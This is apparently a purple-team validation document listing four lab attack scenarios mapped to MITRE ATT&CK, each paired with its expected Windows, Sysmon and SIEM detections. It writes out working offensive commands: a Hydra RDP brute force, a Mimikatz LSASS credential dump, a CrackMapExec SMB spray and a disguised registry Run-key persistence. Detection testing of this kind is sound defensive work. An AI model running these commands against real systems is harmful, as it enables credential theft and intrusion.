# Attack Scenarios

## Overview

This document provides documented attack scenarios for purple team validation.

---

## Scenario 1: Brute Force Attack

### MITRE ATT&CK
- **Technique**: T1110.001 - Brute Force: Password Guessing
- **Tactic**: Credential Access

### Tools
- Hydra
- CrackMapExec

### Execution

```bash
# From Red Kali
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.2.2
```

### Expected Detections
- Windows Event ID 4625 (Failed logon)
- Suricata: ET SCAN RDP Brute Force
- SIEM Alert: Brute Force Detected

---

## Scenario 2: Credential Dumping

### MITRE ATT&CK
- **Technique**: T1003.001 - OS Credential Dumping: LSASS Memory
- **Tactic**: Credential Access

### Tools
- Mimikatz
- CrackMapExec

### Execution

```powershell
# On compromised Windows host
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Expected Detections
- Sysmon Event ID 10 (LSASS access)
- Windows Event ID 4656 (Object access)
- SIEM Alert: Credential Dumping Detected

---

## Scenario 3: Lateral Movement

### MITRE ATT&CK
- **Technique**: T1021.002 - Remote Services: SMB/Windows Admin Shares
- **Tactic**: Lateral Movement

### Tools
- PsExec
- CrackMapExec

### Execution

```bash
# From Red Kali
crackmapexec smb 192.168.2.0/24 -u administrator -p 'Password123!'
```

### Expected Detections
- Windows Event ID 4624 (Logon Type 3)
- Windows Event ID 5140 (Network share access)
- SIEM Alert: Lateral Movement Detected

---

## Scenario 4: Persistence

### MITRE ATT&CK
- **Technique**: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
- **Tactic**: Persistence

### Tools
- reg.exe
- PowerShell

### Execution

```powershell
# Registry persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "C:\temp\payload.exe" /f
```

### Expected Detections
- Sysmon Event ID 13 (Registry value set)
- SIEM Alert: Persistence Mechanism Created

---

## Validation Checklist

| Scenario | MITRE ID | Detection Verified | Alert Triggered |
|----------|----------|-------------------|-----------------|
| Brute Force | T1110.001 | ☐ | ☐ |
| Credential Dumping | T1003.001 | ☐ | ☐ |
| Lateral Movement | T1021.002 | ☐ | ☐ |
| Persistence | T1547.001 | ☐ | ☐ |

---

*Document Version: 1.0*  
*Last Updated: 2026-02-12*
